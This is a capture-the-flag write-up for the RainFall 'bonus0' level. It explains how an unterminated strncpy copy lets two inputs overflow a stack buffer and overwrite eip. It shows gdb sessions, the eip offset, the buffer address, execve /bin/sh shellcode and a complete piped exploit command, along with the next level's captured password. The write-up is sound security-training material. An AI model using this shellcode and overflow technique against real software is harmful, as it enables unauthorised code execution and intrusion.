# Bonus0

We can find an executable waiting for two inputs and print them by separating them with a space :
```
bonus0@RainFall:~$ ./bonus0
 -
bla
 -
blabla
bla blabla
bonus0@RainFall:~$
```
After analyze it with gdb we can find three interesting functions : `main()`, `pp()` and `p()`.  
Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-RainFall/blob/main/bonus0/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-RainFall/blob/main/bonus0/source.c) for full explanations.  
We see that in `p()` function, we can read 4096 characters in a non null-terminated buffer. Then `strncpy()` is call to copy the first 20 bytes (or less if the buffer is less than 20 characters of course) but, as the man said :  
"If the source string has a size greater than that specified in parameter, then the produced string will not be terminated by null ASCII code (character '\0')."  
So the main buffer should look like :  
arg1 + arg2 + space + arg2 -> if arg1 is not null terminated (if first input is 20 characters or longer) but arg2 is null terminated (2nd input shorter than 20 characters long).  
So we can copy 40 + 1 + 20 (61) chars into buffer, of size 42 => we'll have 19 bytes to write over `eip` address. Lets found the offset :  
```
(gdb) run
Starting program: /home/user/bonus0/bonus0
 - 
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa Aa0Aa1Aa2Aa3Aa4Aa5Aa

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
(gdb) info registers
eax            0x0      0
ecx            0xffffffff       -1
edx            0xb7fd28b8       -1208145736
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff740       0xbffff740
ebp            0x32614131       0x32614131
esi            0x0      0
edi            0x0      0
eip            0x41336141       0x41336141
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb)
```
Thanks to the pattern generator we found that the offset of `eip` start at 9.  
Let's see what our inputs should look like :  
1st arg : We'll fill up the large buffer in `p()` with a padding of `NOP` instructions and our shellcode. The size of the padding doesn't matter because we just need to put a random address between the start address of our buffer[4096] (+61 bytes for args) and the end of our padding.
```
=> buffer[4096] : | [ 20 bytes NOP first arg ] + NOP * (x - 20) + [ shellcode ] | 
                  ^                                                             ^
            start address                                                  end address
```
2nd arg : With the offset of `eip` found upper we can write over the `eip` address and replace it by a random address between the start address of our buffer (+61 bytes) and the end of our padding.
```
=> buffer[4096] : | [ 20 bytes NOP first arg ] + [ 20 bytes - 2nd arg ] + [ space ] + [ offset ] + [ address in NOP series ] + [ rest] + NOP * x + [ shellcode ] | 
                  ^                                                                   |------------------ 20 bytes ------------------|                           ^
            start address                                                                                                                                   end address
```

## Create our exploit
*shellcode found [here](http://shell-storm.org/shellcode/files/shellcode-827.php)*  
- 1st step : Create our first input with a padding of `NOP` instructions greater than 61 bytes and less than [4096 bytes - our shellcode]  
	- 100 * NOP instruction + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80  
- 2nd step : Find our buffer[4096] address in order to determine the address between the start of our buffer + 61 and the end of the NOP instructions.
```
(gdb) set disassembly-flavor intel
(gdb) disass p
Dump of assembler code for function p:
[...]
   0x080484d0 <+28>:    lea    eax,[ebp-0x1008]    // buffer start
[...]
(gdb) b *p+28
Breakpoint 1 at 0x80484d0
(gdb) run
Starting program: /home/user/bonus0/bonus0
 - 

Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe680:     0x00000000
(gdb)
```
	- Choose an address between 0xbfffe680 + 61 (0xbfffe6bd) and 0xbfffe680 + 100 (0xbfffe6e4) => 0xbfffe6d0 (\xd0\xe6\xff\xbf)  
- 3rd step : Final exploit  
	- 1st arg = python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'  
	- 2nd arg = python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'  
```
bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
 - 
 - 
AAAAAAAAABBBBBBB AAAAAAAAABBBBBBB
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
^C
bonus0@RainFall:~$ su bonus1
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
bonus1@RainFall:~$
```
Bonus0 passed!
